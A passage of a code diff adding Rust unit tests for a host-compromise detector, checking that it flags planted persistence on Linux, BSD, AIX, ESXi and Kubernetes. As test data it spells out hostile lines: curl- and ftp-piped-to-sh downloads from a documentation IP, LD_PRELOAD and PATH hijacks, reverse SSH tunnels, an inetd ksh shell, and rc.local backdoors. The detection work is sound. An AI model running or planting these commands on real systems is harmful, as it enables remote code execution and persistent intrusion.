+            "/sbin/modprobe snd-card-${MODPROBE_MODULE##sound[_-]slot[_-]}",
+            "{ /sbin/modprobe ov511; } ; /sbin/modprobe --first-time --ignore-install ov518",
+            "/sbin/modprobe --ignore-install nf_conntrack $CMDLINE_OPTS && /sbin/sysctl --quiet --pattern 'net[.]netfilter[.]nf_conntrack.*' --system",
+        ];
+        for args in stock {
+            assert_eq!(check("modprobe-install-command", &rec(args)), None, "{args}");
+        }
+        let bad = [
+            "/tmp/.NXMK_MODPROBE/agent",
+            "/tmp/true",
+            "/bin/true ; /tmp/x",
+            "/sbin/modprobe --ignore-install x && /tmp/agent",
+            "/sbin/modprobe /tmp/evil.ko",
+            "/sbin/modprobe x ; /bin/sh -c 'id'",
+            "/sbin/modprobe x && /sbin/sysctl -w kernel.core_pattern=x",
+            "/sbin/modprobe x && /bin/mount -t tmpfs none /var/tmp",
+            "/sbin/modprobe x && /bin/mount -t nfsd nfsd /etc/cron.d",
+            "/sbin/modprobe x && $(curl http://203.0.113.5/x)",
+            "/sbin/modprobe x > /etc/cron.d/y",
+            "/usr/bin/curl http://203.0.113.5/x",
+        ];
+        for args in bad {
+            assert!(check("modprobe-install-command", &rec(args)).is_some(), "{args}");
+        }
+    }
+
+    #[test]
+    fn stock_pam_exec_and_rc_local_lines() {
+        let pam = |args: &str| json!({"artifact": "pam", "module_type": "session", "module": "pam_exec.so", "service": "login", "arguments": args});
+        assert_eq!(check("pam-exec-module", &pam("type=open_session stdout /bin/uname -snrvm")), None);
+        assert!(check("pam-exec-module", &pam("type=open_session stdout /bin/uname -snrvm; /tmp/x")).is_some());
+        assert!(check("pam-exec-module", &pam("/tmp/.x/agent")).is_some());
+        assert!(check("pam-exec-module", &pam("stdout /usr/local/bin/uname -snrvm")).is_some());
+        let rc = |t: &str| json!({"artifact": "rc-local", "text": t});
+        assert_eq!(check("rc-local-command", &rc("touch /var/lock/subsys/local")), None);
+        assert!(check("rc-local-command", &rc("touch /var/lock/subsys/local; /opt/x")).is_some());
+        assert!(check("rc-local-command", &rc("/opt/x")).is_some());
+    }
+
+    #[test]
+    fn bsd_checks_flag_planted_shapes_and_leave_stock_ones() {
+        // BSD downloaders.
+        assert!(suspicious_command("ftp -o - http://203.0.113.5/x.sh | sh").is_some());
+        assert!(suspicious_command("fetch -qo - http://203.0.113.5/x.sh | sh").is_some());
+        assert_eq!(suspicious_command("ftp -o /usr/local/share/x.tgz http://mirror.example/x.tgz"), None);
+        // OpenBSD's stock ksh.kshrc alias; the same alias elsewhere, or another one, is still reported.
+        let kshrc = |path: &str, text: &str| json!({"artifact": "shell-profiles", "source_path": path, "text": text});
+        assert_eq!(check("shell-profile-suspicious", &kshrc("etc/ksh.kshrc", "\t\talias su=wsu")), None);
+        assert!(check("shell-profile-suspicious", &kshrc("home/bob/.kshrc", "alias su=wsu")).is_some());
+        assert!(check("shell-profile-suspicious", &kshrc("etc/ksh.kshrc", "alias su=/tmp/x")).is_some());
+        // The stock toor account is not a second uid 0; a look-alike is.
+        let toor = |gecos: &str, hash: &str| json!({"artifact": "master-passwd", "user": "toor", "uid": 0, "gecos": gecos, "hash_type": hash});
+        assert_eq!(check("master-passwd-extra-uid0", &toor("Bourne-again Superuser", "none")), None);
+        assert!(check("master-passwd-extra-uid0", &toor("Bourne-again Superuser", "sha512crypt")).is_some());
+        assert!(check("master-passwd-extra-uid0", &toor("Toor", "none")).is_some());
+        let passwd = |gecos: &str, field: &str| json!({"artifact": "passwd", "user": "toor", "uid": 0, "gecos": gecos, "password_field": field});
+        assert_eq!(check("passwd-extra-uid0", &passwd("Bourne-again Superuser", "*")), None);
+        assert!(check("passwd-extra-uid0", &passwd("Bourne-again Superuser", "x")).is_some());
+        assert!(check(
+            "master-passwd-passwordless",
+            &json!({"artifact": "master-passwd", "user": "n", "passwordless": true})
+        )
+        .is_some());
+        // rc.d, rc.conf, ttys, doas, devd, jails, loader.conf.
+        let rcd =
+            json!({"artifact": "rc-d", "command": "/bin/sh -c 'ftp -o - http://203.0.113.5/x | sh'", "commands": ""});
+        assert!(check("rc-d-suspicious-command", &rcd).is_some());
+        let base = json!({"artifact": "rc-d", "command": "", "commands": "mkdir /tmp/x; /tmp/clean_tmps -f"});
+        assert_eq!(check("rc-d-suspicious-command", &base), None);
+        let body = json!({"artifact": "rc-d", "command": "", "commands": "curl -s http://203.0.113.5/x | sh"});
+        assert!(check("rc-d-suspicious-command", &body).is_some());
+        assert!(
+            check("rc-conf-suspicious-service", &json!({"artifact": "rc-conf", "command": "/tmp/.x/agent"})).is_some()
+        );
+        assert_eq!(
+            check("rc-conf-suspicious-service", &json!({"artifact": "rc-conf", "command": "/usr/sbin/sshd"})),
+            None
+        );
+        let tty = |command: &str| json!({"artifact": "ttys", "tty": "ttyv0", "command": command, "status": "on"});
+        assert_eq!(check("ttys-nonstandard-command", &tty("/usr/libexec/getty Pc")), None);
+        assert_eq!(check("ttys-nonstandard-command", &tty("none")), None);
+        assert!(check("ttys-nonstandard-command", &tty("/usr/local/bin/agent -d")).is_some());
+        assert!(check("ttys-suspicious-command", &tty("/tmp/agent")).is_some());
+        let doas = |nopass: bool, command: &str| json!({"artifact": "doas-conf", "action": "permit", "nopass": nopass, "command": command, "text": "permit nopass alice"});
+        assert!(check("doas-permit-nopass", &doas(true, "")).is_some());
+        assert_eq!(check("doas-permit-nopass", &doas(true, "/sbin/reboot")), None);
+        assert_eq!(check("doas-permit-nopass", &doas(false, "")), None);
+        assert!(check(
+            "devd-action-suspicious",
+            &json!({"artifact": "devd-conf", "command": "curl -s http://203.0.113.5/x | sh"})
+        )
+        .is_some());
+        assert!(check("jail-exec-suspicious", &json!({"artifact": "jail-conf", "command": "/tmp/x"})).is_some());
+        let loader = |enabled: bool| json!({"artifact": "loader-conf", "kind": "module_load", "enabled": enabled, "module": "nxmk", "variable": "nxmk_load"});
+        assert!(check("loader-module-load", &loader(true)).is_some());
+        assert_eq!(check("loader-module-load", &loader(false)), None);
+        let local = |t: &str| json!({"artifact": "bsd-rc-local", "text": t});
+        assert!(check("rc-local-command", &local("/usr/local/bin/x &")).is_some());
+        assert_eq!(check("rc-local-command", &local("exit 0")), None);
+        assert!(check("rc-local-suspicious", &local("ftp -o - http://203.0.113.5/x | sh")).is_some());
+    }
+
+    #[test]
+    fn environment_checks_name_ld_preload_and_path_hijacks() {
+        let env = |text: &str| json!({"artifact": "shell-profiles", "source_path": "etc/environment", "text": text});
+        let pam =
+            |text: &str| json!({"artifact": "env-config", "source_path": "etc/security/pam_env.conf", "text": text});
+        assert!(check("environment-ld-preload", &env("LD_PRELOAD=/usr/local/lib/libx.so")).is_some());
+        assert!(check("environment-ld-preload", &env("export LD_AUDIT=\"/opt/a.so\"")).is_some());
+        assert!(check("environment-ld-preload", &env("LD_LIBRARY_PATH=/tmp/lib")).is_some());
+        assert!(check("environment-ld-preload", &pam("LD_PRELOAD DEFAULT=/usr/lib/x.so")).is_some());
+        assert!(check("environment-ld-preload", &pam("LD_PRELOAD OVERRIDE=/usr/lib/x.so")).is_some());
+        assert_eq!(check("environment-ld-preload", &env("LD_PRELOAD=")), None);
+        assert_eq!(check("environment-ld-preload", &env("LANG=en_US.UTF-8")), None);
+        assert_eq!(check("environment-ld-preload", &pam("EDITOR DEFAULT=vim")), None);
+        // Outside /etc/environment, a shell file is judged by the shell-profile check instead.
+        let profile = json!({"artifact": "shell-profiles", "source_path": "etc/profile", "text": "LD_PRELOAD=/x.so"});
+        assert_eq!(check("environment-ld-preload", &profile), None);
+        assert!(check("shell-profile-suspicious", &profile).is_some());
+        assert_eq!(check("shell-profile-suspicious", &env("LD_PRELOAD=/x.so")), None);
+
+        assert!(check("environment-path-hijack", &env("PATH=/tmp/bin:/usr/bin")).is_some());
+        assert!(check("environment-path-hijack", &env("PATH=\".:/usr/bin\"")).is_some());
+        assert!(check("environment-path-hijack", &env("PATH=:/usr/bin")).is_some());
+        assert!(check("environment-path-hijack", &env("PATH=/usr/bin:/home/a/.hidden/bin")).is_some());
+        assert!(check("environment-path-hijack", &pam("PATH DEFAULT=/dev/shm:${PATH}")).is_some());
+        assert_eq!(
+            check(
+                "environment-path-hijack",
+                &env("PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\"")
+            ),
+            None
+        );
+        assert_eq!(check("environment-path-hijack", &env("PATH=/home/a/.local/bin:/usr/bin")), None);
+    }
+
+    #[test]
+    fn enablement_links_are_checked_by_where_they_point() {
+        let link = |path: &str, kind: &str, target: &str, scope: &str| json!({"artifact": "systemd-enablement", "source_path": path, "kind": kind, "unit": "x.service", "target": target, "scope": scope});
+        let id = "systemd-enablement-outside-unit-dirs";
+        let wants = "etc/systemd/system/multi-user.target.wants/x.service";
+        assert_eq!(check(id, &link(wants, "wants", "/lib/systemd/system/x.service", "system")), None);
+        assert_eq!(check(id, &link(wants, "wants", "/etc/systemd/system/x.service", "system")), None);
+        assert_eq!(check(id, &link(wants, "wants", "../x.service", "system")), None);
+        assert_eq!(check(id, &link(wants, "wants", "../../../../usr/lib/systemd/system/x.service", "system")), None);
+        assert_eq!(check(id, &link("etc/systemd/system/sshd.service", "link", "ssh.service", "system")), None);
+        assert_eq!(check(id, &link("etc/systemd/system/x.service", "mask", "/dev/null", "system")), None);
+        assert!(check(id, &link(wants, "wants", "/tmp/.x/x.service", "system")).is_some());
+        assert!(check(id, &link(wants, "wants", "/home/a/x.service", "system")).is_some());
+        assert!(check(id, &link(wants, "wants", "../../../../../../../tmp/x.service", "system")).is_some());
+        assert!(check(id, &link("etc/systemd/system/x.service", "link", "/opt/app/x.service", "system")).is_some());
+        let user = "home/alice/.config/systemd/user/default.target.wants/x.service";
+        assert_eq!(check(id, &link(user, "wants", "../x.service", "user")), None);
+        assert_eq!(check(id, &link(user, "wants", "/home/alice/.config/systemd/user/x.service", "user")), None);
+        assert!(check(id, &link(user, "wants", "/tmp/x.service", "user")).is_some());
+        let linger = json!({"artifact": "systemd-enablement", "kind": "linger", "owner": "alice"});
+        assert!(check("systemd-linger", &linger).unwrap().contains("alice"));
+    }
+
+    #[test]
+    fn enabled_units_say_so_and_timers_report_the_service_they_start() {
+        let service = json!({"artifact": "systemd-units", "unit_type": "service", "exec_start": "/tmp/.x/agent",
+            "joined": {"enablement": "enabled", "enabled_by": ["wanted by multi-user.target"]}});
+        let detail = check("systemd-suspicious-exec", &service).unwrap();
+        assert!(detail.ends_with("[enabled: wanted by multi-user.target]"), "{detail}");
+        let dormant = json!({"artifact": "systemd-units", "exec_start": "/tmp/.x/agent", "joined": {"enablement": "not-enabled"}});
+        assert!(check("systemd-suspicious-exec", &dormant).unwrap().ends_with("[not enabled]"));
+        let unknown = json!({"artifact": "systemd-units", "exec_start": "/tmp/.x/agent"});
+        assert!(check("systemd-suspicious-exec", &unknown).unwrap().ends_with("directory: /tmp/.x/agent"));
+
+        let timer = json!({"artifact": "systemd-units", "unit_type": "timer",
+            "joined": {"enablement": "enabled", "enabled_by": ["wanted by timers.target"],
+                       "starts": {"unit": "job.service", "exec_start": "/tmp/.x/agent"}}});
+        let detail = check("systemd-timer-suspicious-service", &timer).unwrap();
+        assert!(detail.starts_with("timer -> job.service [enabled: wanted by timers.target]: exec_start"), "{detail}");
+        assert!(detail.contains("/tmp/.x/agent"));
+        assert_eq!(check("systemd-trigger-suspicious-service", &timer), None);
+        let benign = json!({"artifact": "systemd-units", "unit_type": "timer",
+            "joined": {"starts": {"unit": "job.service", "exec_start": "/usr/bin/true"}}});
+        assert_eq!(check("systemd-timer-suspicious-service", &benign), None);
+        let socket = json!({"artifact": "systemd-units", "unit_type": "socket",
+            "joined": {"starts": {"unit": "job.service", "exec_start_pre": "/tmp/x"}}});
+        assert!(check("systemd-trigger-suspicious-service", &socket).unwrap().starts_with("socket -> job.service"));
+    }
+
+    #[test]
+    fn linker_and_sshd_and_module_checks() {
+        let ld = |path: &str| json!({"artifact": "ld-preload", "kind": "library_path", "path": path});
+        for ok in [
+            "/usr/lib/x86_64-linux-gnu",
+            "/lib64",
+            "/usr/local/lib",
+            "/usr/local/lib/x86_64-linux-gnu",
+            "/usr/lib64/atlas",
+        ] {
+            assert_eq!(check("ld-library-path-unusual", &ld(ok)), None, "{ok}");
+        }
+        for bad in ["/opt/lib", "/home/a/lib", "/usr/libfoo", "/var/lib/x", "/usr/local/bin"] {
+            assert!(check("ld-library-path-unusual", &ld(bad)).is_some(), "{bad}");
+        }
+        let sshd = |keyword: &str, value: &str, cond: &str| json!({"artifact": "sshd-config", "keyword": keyword, "value": value, "match_condition": cond});
+        assert_eq!(
+            check(
+                "sshd-authorized-keys-command",
+                &sshd("AuthorizedKeysCommand", "/usr/bin/userdbctl ssh-authorized-keys %u", "")
+            ),
+            None
+        );
+        assert_eq!(check("sshd-authorized-keys-command", &sshd("AuthorizedKeysCommand", "none", "")), None);
+        assert!(check("sshd-authorized-keys-command", &sshd("AuthorizedKeysCommand", "/usr/local/bin/keys %u", ""))
+            .is_some());
+        assert!(check(
+            "sshd-authorized-keys-command",
+            &sshd("AuthorizedKeysCommand", "/usr/bin/userdbctl ssh-authorized-keys root", "")
+        )
+        .is_some());
+        assert_eq!(check("sshd-force-command", &sshd("ForceCommand", "internal-sftp", "User sftp")), None);
+        assert_eq!(check("sshd-force-command", &sshd("ForceCommand", "internal-sftp -d /srv", "User sftp")), None);
+        assert!(check("sshd-force-command", &sshd("ForceCommand", "/usr/local/bin/menu", "User a"))
+            .unwrap()
+            .contains("(Match User a)"));
+        assert!(check("sshd-command-suspicious", &sshd("ForceCommand", "/tmp/x", "")).is_some());
+        assert!(check("sshd-command-suspicious", &sshd("AuthorizedKeysCommand", "curl http://203.0.113.5/k | sh", ""))
+            .is_some());
+        assert_eq!(check("sshd-command-suspicious", &sshd("AuthorizedKeysCommandUser", "/tmp/x", "")), None);
+
+        let module = |known: Value| json!({"artifact": "modules-load", "kind": "load", "module": "nxmk_x", "module_in_kernel_tree": known});
+        assert!(check("modules-load-unknown-module", &module(json!(false))).is_some());
+        assert_eq!(check("modules-load-unknown-module", &module(json!(true))), None);
+        assert_eq!(check("modules-load-unknown-module", &module(Value::Null)), None);
+    }
+
+    #[test]
+    fn script_hook_checks_use_the_command_rules() {
+        let line = |artifact: &str, text: &str| json!({"artifact": artifact, "text": text, "section": "postrotate"});
+        for (artifact, id) in [
+            ("motd-scripts", "motd-script-suspicious"),
+            ("nm-dispatcher", "nm-dispatcher-suspicious"),
+            ("logrotate-scripts", "logrotate-script-suspicious"),
+        ] {
+            assert!(check(id, &line(artifact, "/tmp/.x/agent >/dev/null 2>&1 &")).is_some(), "{id}");
+            assert!(check(id, &line(artifact, "curl -fsSL http://203.0.113.5/i | sh")).is_some(), "{id}");
+            assert_eq!(check(id, &line(artifact, "uname -snrvm")), None, "{id}");
+            assert_eq!(check(id, &line(artifact, "invoke-rc.d rsyslog rotate > /dev/null")), None, "{id}");
+        }
+        let generator = json!({"artifact": "systemd-generators", "source_path": "etc/systemd/system-generators/g", "mode": "100755", "uid": 0});
+        assert!(check("systemd-generator-in-etc", &generator).unwrap().contains("etc/systemd/system-generators/g"));
+    }
+
+    #[test]
+    fn default_account_sudo_rule_is_its_own_lower_check() {
+        let rule = |joined: Value| {
+            json!({"artifact": "sudoers", "kind": "rule", "nopasswd": true, "commands": "ALL",
+            "text": "rocky ALL=(ALL) NOPASSWD:ALL", "joined": joined})
+        };
+        let plain = rule(Value::Null);
+        assert!(check("sudoers-nopasswd-all", &plain).is_some());
+        assert_eq!(check("sudoers-default-account-nopasswd", &plain), None);
+        let cloud = rule(json!({"default_account": "rocky"}));
+        assert_eq!(check("sudoers-nopasswd-all", &cloud), None);
+        assert!(check("sudoers-default-account-nopasswd", &cloud).unwrap().contains("rocky (uid 1000)"));
+    }
+
+    /// The text rules of this change take attacker-written lines: inserting awkward characters
+    /// (quotes, parentheses, multi-byte, NUL) at every position and cutting at every position
+    /// must not panic.
+    #[test]
+    fn mutated_lines_do_not_panic() {
+        let seeds = [
+            r#"PROMPT_COMMAND+=('printf "\033]0;%s" "${USER}"' "$(id)") ; PROMPT_COMMAND="a;b""#,
+            r#"/sbin/modprobe --ignore-install x && { /bin/mount -t nfsd nfsd /proc/fs/nfsd > /dev/null 2>&1 || :; }"#,
+            r#"export PATH="/tmp:/usr/bin::." LD_PRELOAD DEFAULT=/a OVERRIDE='/b'"#,
+            r#"foreach f ("$HOME/.i18n" /etc/x) ; echo é"#,
+        ];
+        let mut runs = 0;
+        for seed in seeds {
+            let boundaries: Vec<usize> = seed.char_indices().map(|(i, _)| i).chain([seed.len()]).collect();
+            for &at in &boundaries {
+                let mut lines = vec![seed[..at].to_string()];
+                for insert in ["'", "\"", "(", ")", "é", "\0", "$(", "\\", "{", "}", ";"] {
+                    lines.push(format!("{}{insert}{}", &seed[..at], &seed[at..]));
+                }
+                for line in lines {
+                    let _ = prompt_command_runs_code(&line);
+                    let _ = stock_modprobe_command(&line);
+                    let _ = env_library_hijack(&line);
+                    let _ = env_path_hijack(&line);
+                    let _ = suspicious_command(&line);
+                    let _ = stock_pam_exec(&line);
+                    runs += 1;
+                }
+            }
+        }
+        assert!(runs > 500, "{runs}");
+    }
+    #[test]
+    fn ssh_tunnels_are_told_from_ordinary_ssh() {
+        for bad in [
+            "/usr/bin/ssh -N -R 2222:localhost:22 u@h",
+            "ssh -NfR8080:localhost:80 u@h",
+            "autossh -M 0 -L 5432:db:5432 u@h",
+            "ssh -D 1080 -q u@h",
+            "/usr/bin/ssh -o RemoteForward=9000:localhost:22 u@h",
+            "ssh -oDynamicForward=1080 u@h",
+            "ssh -w 0:0 root@h",
+            "sudo -u tunnel /usr/bin/ssh -i /root/k -NR 2200:127.0.0.1:22 u@h",
+        ] {
+            assert!(ssh_tunnel(bad).is_some(), "{bad}");
+        }
+        for good in [
+            "ssh u@h uptime",
+            "ssh -o ServerAliveInterval=30 u@h",
+            "ssh -i /root/.ssh/id -p 2222 u@h 'ls -R /tmp'",
+            "scp -R a b",
+            "/usr/sbin/sshd -D",
+            "ssh-keygen -R host",
+            "echo ssh -R",
+            "",
+        ] {
+            assert_eq!(ssh_tunnel(good), None, "{good}");
+        }
+    }
+
+    #[test]
+    fn remote_access_programs_are_told_by_name() {
+        for (command, tool) in [
+            ("/usr/bin/anydesk --service", "AnyDesk"),
+            ("/opt/teamviewer/tv_bin/teamviewerd -d", "TeamViewer"),
+            ("rustdesk --service", "RustDesk"),
+            ("/usr/local/bin/ngrok start --all", "ngrok"),
+            ("/usr/bin/cloudflared tunnel run x", "cloudflared"),
+            ("sh -c 'nohup /tmp/frpc -c /tmp/f.toml &'", "frp client"),
+            ("/usr/local/bin/code tunnel --accept-server-license-terms", "VS Code tunnel"),
+            ("/usr/sbin/tailscaled --state=/var/lib/tailscale/tailscaled.state", "Tailscale"),
+            ("/usr/local/mesh_services/meshagent/meshagent --daemon", "MeshAgent"),
+        ] {
+            assert_eq!(remote_tool(command), Some(tool), "{command}");
+        }
+        for good in [
+            "/usr/bin/code --wait file",
+            "/usr/sbin/sshd -D",
+            "echo anydesk is not started",
+            "/usr/bin/codec",
+            "/bin/gosts",
+            "",
+        ] {
+            // `echo anydesk ...` still names the program as a word: the rule is by word, not by context.
+            let hit = remote_tool(good);
+            assert!(hit.is_none() || good.starts_with("echo"), "{good}: {hit:?}");
+        }
+    }
+
+    #[test]
+    fn kubernetes_node_takeover_checks() {
+        let pod = |kind: &str, file: &str, privileged: bool, paths: Value| {
+            json!({"artifact": "k8s-manifests", "source_kind": kind, "source_path": file, "document": 1, "kind": "Pod", "name": "p",
+                   "images": ["i:1"], "privileged": privileged, "host_pid": false, "host_network": true, "host_paths": paths})
+        };
+        let static_dir = "etc/kubernetes/manifests";
+        for stock in ["kube-apiserver", "etcd", "kube-controller-manager", "kube-scheduler"] {
+            assert_eq!(
+                check(
+                    "k8s-static-pod-unexpected",
+                    &pod("static-pod", &format!("{static_dir}/{stock}.yaml"), false, json!([]))
+                ),
+                None,
+                "{stock}"
+            );
+        }
+        assert!(check(
+            "k8s-static-pod-unexpected",
+            &pod("static-pod", &format!("{static_dir}/kube-vip.yaml"), false, json!([]))
+        )
+        .is_some());
+        assert!(check(
+            "k8s-static-pod-unexpected",
+            &pod("k3s-static-pod", "var/lib/rancher/k3s/agent/pod-manifests/etcd.yaml", false, json!([]))
+        )
+        .is_some());
+        assert_eq!(
+            check("k8s-static-pod-unexpected", &pod("k3s-auto-apply", "x/server/manifests/a.yaml", false, json!([]))),
+            None
+        );
+        let hostile = pod("static-pod", &format!("{static_dir}/x.yaml"), true, json!(["/etc/ssl/certs", "/"]));
+        assert!(check("k8s-static-pod-host-access", &hostile)
+            .unwrap()
+            .contains("privileged, hostNetwork with hostPath /"));
+        assert!(check(
+            "k8s-static-pod-host-access",
+            &pod("static-pod", &format!("{static_dir}/x.yaml"), false, json!(["/var/run/docker.sock"]))
+        )
+        .is_some());
+        // The stock control-plane pods mount certificates and kubeconfigs, never the root or a socket.
+        assert_eq!(
+            check(
+                "k8s-static-pod-host-access",
+                &pod(
+                    "static-pod",
+                    &format!("{static_dir}/kube-apiserver.yaml"),
+                    false,
+                    json!(["/etc/kubernetes/pki", "/etc/ssl/certs"])
+                )
+            ),
+            None
+        );
+        assert_eq!(
+            check(
+                "k8s-static-pod-host-access",
+                &pod("static-pod", &format!("{static_dir}/x.yaml"), true, json!(["/etc/ssl/certs"]))
+            ),
+            None
+        );
+        let auto = |path: &str, doc: u64| json!({"artifact": "k8s-manifests", "source_kind": "k3s-auto-apply", "source_path": path, "document": doc, "kind": "DaemonSet", "name": "d"});
+        let dir = "var/lib/rancher/k3s/server/manifests";
+        for stock in ["coredns.yaml", "local-storage.yaml", "metrics-server/aggregated-metrics-reader.yaml"] {
+            assert_eq!(check("k3s-auto-apply-not-stock", &auto(&format!("{dir}/{stock}"), 1)), None, "{stock}");
+        }
+        assert!(check("k3s-auto-apply-not-stock", &auto(&format!("{dir}/extra.yaml"), 1)).is_some());
+        assert_eq!(check("k3s-auto-apply-not-stock", &auto(&format!("{dir}/extra.yaml"), 2)), None);
+        let kubelet = |anon: Value, mode: &str| json!({"artifact": "kubelet-config", "anonymous_auth": anon, "authorization_mode": mode});
+        assert!(check("kubelet-anonymous-auth", &kubelet(json!(true), "Webhook")).is_some());
+        assert_eq!(check("kubelet-anonymous-auth", &kubelet(json!(false), "Webhook")), None);
+        assert_eq!(check("kubelet-anonymous-auth", &kubelet(Value::Null, "")), None);
+        assert!(check("kubelet-authorization-always-allow", &kubelet(json!(false), "AlwaysAllow")).is_some());
+        assert_eq!(check("kubelet-authorization-always-allow", &kubelet(json!(false), "Webhook")), None);
+    }
+
+    #[test]
+    fn tunnel_and_vpn_configuration_checks() {
+        let row = |tool: &str, kind: &str, user: &str, target: &str, detail: Value| json!({"artifact": "remote-access-config", "tool": tool, "kind": kind, "user": user, "name": "n", "id": "i", "server": "", "target": target, "detail": detail});
+        assert!(check("tunnel-exposes-local-service", &row("ngrok", "tunnel", "root", "22", json!([])))
+            .unwrap()
+            .contains("exposes 22"));
+        assert_eq!(
+            check("tunnel-exposes-local-service", &row("cloudflared", "tunnel", "", "http_status:404", json!([]))),
+            None
+        );
+        assert_eq!(check("tunnel-exposes-local-service", &row("ngrok", "config", "root", "", json!([]))), None);
+        assert_eq!(check("tunnel-exposes-local-service", &row("vscode-tunnel", "tunnel", "root", "", json!([]))), None);
+        assert!(
+            check("vscode-tunnel-service-account", &row("vscode-tunnel", "tunnel", "root", "", json!([]))).is_some()
+        );
+        assert!(check("vscode-tunnel-service-account", &row("vscode-tunnel", "tunnel", "www-data", "", json!([])))
+            .is_some());
+        assert_eq!(
+            check("vscode-tunnel-service-account", &row("vscode-tunnel", "tunnel", "alice", "", json!([]))),
+            None
+        );
+        assert!(check("remote-access-tool-present", &row("tailscale", "node", "", "", json!([])))
+            .unwrap()
+            .starts_with("tailscale configured"));
+        assert_eq!(
+            check("remote-access-tool-present", &row("vscode-server", "extension", "alice", "", json!([]))),
+            None
+        );
+        let hook = |d: &str| row("wireguard", "interface", "", "", json!([d]));
+        assert!(check("vpn-hook-suspicious", &hook("PostUp=curl http://203.0.113.9/x | sh")).is_some());
+        assert!(check("vpn-hook-suspicious", &hook("up=/tmp/.x/agent")).is_some());
+        assert_eq!(check("vpn-hook-suspicious", &hook("PostUp=iptables -A FORWARD -i %i -j ACCEPT")), None);
+        assert_eq!(check("vpn-hook-suspicious", &hook("ListenPort=51820")), None);
+    }
+
+    #[test]
+    fn aix_checks_match_their_records() {
+        let by_id = |id: &str, artifact: &str| CHECKS.iter().find(|c| c.id == id && c.artifact == artifact).unwrap();
+        let hit = |id: &str, artifact: &str, record: serde_json::Value| (by_id(id, artifact).test)(&record).is_some();
+
+        let inittab = |command: &str| json!({"id": "x1", "runlevels": "2", "action": "respawn", "command": command});
+        assert!(hit("aix-inittab-nonsystem-command", "aix-inittab", inittab("/data/agent/run --daemon")));
+        assert!(!hit("aix-inittab-nonsystem-command", "aix-inittab", inittab("/usr/sbin/cron")));
+        assert!(!hit("aix-inittab-nonsystem-command", "aix-inittab", inittab("/etc/rc.tcpip > /dev/console 2>&1")));
+        assert!(!hit("aix-inittab-nonsystem-command", "aix-inittab", json!({"action": "initdefault", "command": ""})));
+        assert!(hit("aix-inittab-suspicious-command", "aix-inittab", inittab("/tmp/.x/sh -i")));
+        assert!(!hit("aix-inittab-suspicious-command", "aix-inittab", inittab("/usr/sbin/srcmstr")));
+
+        let profile = |t: &str| json!({"text": t, "source_path": "etc/environment"});
+        assert!(hit("aix-loader-hijack", "shell-profiles", profile("LDR_PRELOAD=/tmp/evil.so")));
+        assert!(hit("aix-loader-hijack", "shell-profiles", profile("export LDR_PRELOAD64=/opt/x/lib.so")));
+        assert!(hit("aix-loader-hijack", "shell-profiles", profile("LIBPATH=/usr/lib:/tmp/lib")));
+        assert!(!hit("aix-loader-hijack", "shell-profiles", profile("LIBPATH=/usr/lib:/lib")));
+        assert!(!hit("aix-loader-hijack", "shell-profiles", profile("LDR_PRELOAD=")));
+
+        let inetd = json!({"service": "bd", "program": "/bin/ksh", "arguments": "ksh -i"});
+        assert!(hit("aix-inetd-shell-service", "aix-inetd-conf", inetd));
+        assert!(!hit(
+            "aix-inetd-shell-service",
+            "aix-inetd-conf",
+            json!({"service": "ftp", "program": "/usr/sbin/ftpd"})
+        ));
+        let rhosts = json!({"wildcard": true, "denied": false, "peer": "+", "user": "+", "file": ".rhosts", "source_path": ".rhosts"});
+        assert!(hit("aix-rhosts-wildcard", "aix-rhosts", rhosts.clone()));
+        assert!(hit("aix-rhosts-user-file", "aix-rhosts", rhosts));
+        assert!(!hit(
+            "aix-rhosts-user-file",
+            "aix-rhosts",
+            json!({"file": "hosts.equiv", "denied": false, "peer": "a"})
+        ));
+        assert!(hit(
+            "aix-kernel-extension-in-temp",
+            "aix-genkex",
+            json!({"path": "/tmp/.x/rk.ext", "address": "1a30000"})
+        ));
+        assert!(!hit("aix-kernel-extension-in-temp", "aix-genkex", json!({"path": "/usr/lib/drivers/nfs.ext"})));
+    }
+
+    #[test]
+    fn esxi_persistence_checks() {
+        let rc = |t: &str| json!({"artifact": "esxi-rc-local", "text": t});
+        assert_eq!(check("esxi-rc-local-command", &rc("exit 0")), None);
+        assert!(check("esxi-rc-local-command", &rc("/opt/x --daemon")).is_some());
+        assert!(check("esxi-rc-local-suspicious", &rc("/tmp/.a/run &")).is_some());
+        assert_eq!(check("esxi-rc-local-suspicious", &rc("esxcli system settings advanced set -o /x -i 1")), None);
+        let file =
+            |path: &str, mode: &str| json!({"artifact": "esxi-rc-local-files", "source_path": path, "mode": mode});
+        for stock in
+            ["etc/rc.local.d/local.sh", "etc/rc.local.d/kickstart.py", "etc/rc.local.d/autodeploy/scriptBundle.py"]
+        {
+            assert_eq!(check("esxi-rc-local-unexpected-file", &file(stock, "100755")), None, "{stock}");
+        }
+        assert!(check("esxi-rc-local-unexpected-file", &file("etc/rc.local.d/backdoor.sh", "100755")).is_some());
+        assert!(check("esxi-rc-local-unexpected-file", &file("etc/rc.local.d/backdoor.sh", "0")).is_some());
+        assert_eq!(check("esxi-rc-local-unexpected-file", &file("etc/rc.local.d/notes.txt", "100644")), None);
+        assert_eq!(check("esxi-rc-local-unexpected-file", &file("etc/rc.local.d/.hidden", "100755")), None);
+
+        let vib = |level: &str, files: Value| json!({"artifact": "esxi-vib", "name": "x", "version": "1", "acceptance_level": level, "files": files});
+        assert!(check("esxi-vib-community", &vib("community", json!([]))).is_some());
+        assert_eq!(check("esxi-vib-community", &vib("certified", json!([]))), None);
+        let listed =
+            json!({"artifact": "esxi-vib-list", "name": "x", "version": "1", "acceptance_level": "CommunitySupported"});
+        assert!(check("esxi-vib-community", &listed).is_some());
+        assert!(check("esxi-vib-startup-file", &vib("certified", json!(["etc/init.d/agent"]))).is_some());
+        assert_eq!(
+            check("esxi-vib-startup-file", &vib("certified", json!(["bin/agent", "usr/lib/vmware/x.so"]))),
+            None
+        );
+
+        let ace = |user: &str, group: bool, role: i64| json!({"artifact": "esxi-permissions", "user": user, "is_group": group, "role_id": role, "entity": "ha-folder-root"});
+        assert_eq!(check("esxi-admin-permission", &ace("root", false, -1)), None);
+        assert_eq!(check("esxi-admin-permission", &ace("vpxuser", false, -1)), None);
+        assert_eq!(check("esxi-admin-permission", &ace("mallory", false, -3)), None);
+        assert!(check("esxi-admin-permission", &ace("mallory", false, -1)).is_some());
+        assert!(check("esxi-admin-permission", &ace("ESX Admins", true, -1)).is_some());
+
+        let leaf = |key: &str, value: &str| json!({"artifact": "esxi-host-config", "key": key, "value": value});
